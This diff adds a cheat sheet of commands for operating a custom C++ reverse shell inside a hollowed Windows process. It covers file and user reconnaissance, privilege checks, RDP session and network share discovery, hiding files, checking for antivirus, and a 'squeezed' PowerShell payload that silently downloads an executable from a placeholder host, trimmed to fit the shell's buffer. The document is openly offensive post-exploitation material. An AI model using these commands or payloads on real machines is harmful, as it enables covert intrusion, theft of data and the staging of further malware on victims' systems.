@@ -1,0 +1,70 @@
+1. Internal Commands (Handled by your C++ code)
+
+These don't spawn a new process; they change the state of your resident shell directly.
+
+    cd [path]: Changes the working directory of the hollowed process.
+
+        Example: cd C:\Users\Public
+
+    exit: Gracefully closes the connection and terminates the shell loop.
+
+2. File & Directory Recon (CMD)
+
+These are passed to _popen and use the "Current Working Directory" you set with cd.
+
+    dir: List files in the current folder.
+
+    dir /s /b: List every file on the drive in "bare" format (full paths).
+
+    type [filename]: Read a file's content directly into your socket.
+
+    where /r C:\ *.pdf: Find every PDF file on the C: drive.
+
+    attrib +h [file]: Hide a file from the standard user view.
+
+3. System & User Recon (CMD)
+
+    whoami /priv: See if you have high-level privileges (like SeDebugPrivilege).
+
+    net user: List all user accounts on the machine.
+
+    net localgroup administrators: See who has admin rights.
+
+    qwinsta: See if other users are currently logged in via RDP.
+
+    tasklist /svc: See which services are running inside which processes.
+
+4. Networking & Connectivity
+
+    ipconfig /all: Get the full network configuration.
+
+    route print: View the routing table (useful for finding internal subnets).
+
+    netstat -ano | findstr :80: Check if anything is listening on port 80.
+
+    net view \\target-computer: List shares on a remote computer in the network.
+
+5. PowerShell Shorthand (The "Squeezed" Payload)
+
+Since we want to keep the payload under your 4096-character buffer limit, use these shortened versions:
+
+    List all processes with owners: powershell -c "gps | select name, @{n='User';e={$_.pscomputername}}"
+
+    Download a tool silently: powershell -c "iwr -uri 'http://link.com/file.exe' -outf 'C:\temp\f.exe'"
+
+    Check for Antivirus: powershell -c "Get-CimInstance -Namespace root/SecurityCenter2 AntiVirusProduct"
+
+
+
+
+    1. Navigating to the Root of C:
+
+To actually move the process context to the root directory, you must use a backslash:
+
+    Command: cd C:\ or just cd \
+
+2. Navigating to a Different Drive
+
+If you eventually want to switch to a different drive (like D:), the standard cd command in Windows won't work unless you use the /d flag. In your shell, you would type:
+
+    Command: cd /d D:\
